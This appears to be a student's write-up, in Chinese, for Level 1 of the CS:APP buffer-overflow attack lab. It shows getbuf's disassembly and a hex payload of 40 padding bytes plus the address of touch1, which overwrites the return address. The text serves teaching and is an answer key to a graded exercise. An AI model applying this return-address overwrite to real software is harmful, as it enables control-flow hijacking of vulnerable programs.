# attack

## ctarget

```sh
cat ans | ./hex2raw | ./ctarget -q
```

### Level 1

函数 `getbuf` 当中调用了无缓冲区溢出检查的函数 `Gets`, 它所写入的缓冲区是 `%rdi`, 而代码中只为其分配了 40 个字节:

```
00000000004017a8 <getbuf>:
  4017a8:       48 83 ec 28             subq   $0x28,%rsp
  4017ac:       48 89 e7                movq   %rsp,%rdi
  4017af:       e8 8c 02 00 00          callq  401a40 <Gets>
  4017b4:       b8 01 00 00 00          movl   $0x1,%eax
  4017b9:       48 83 c4 28             addq   $0x28,%rsp
  4017bd:       c3                      retq
  4017be:       90                      nop
  4017bf:       90                      nop

00000000004017c0 <touch1>:
  4017c0:       48 83 ec 08             subq   $0x8,%rsp
  4017c4:       c7 05 0e 2d 20 00 01    movl   $0x1,0x202d0e(%rip)        # 6044dc <vlevel>
  4017cb:       00 00 00
  4017ce:       bf c5 30 40 00          movl   $0x4030c5,%edi
  4017d3:       e8 e8 f4 ff ff          callq  400cc0 <puts@plt>
  4017d8:       bf 01 00 00 00          movl   $0x1,%edi
  4017dd:       e8 ab 04 00 00          callq  401c8d <validate>
  4017e2:       bf 00 00 00 00          movl   $0x0,%edi
  4017e7:       e8 54 f6 ff ff          callq  400e40 <exit@plt>
```

因此, 做法是劫持 `4017af` 压入栈顶的返回地址 `4017b4`, 将其修改为 `4017c0`.

攻击 payload 是:

```
41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 c0 17 40 00 00 00 00 00
```
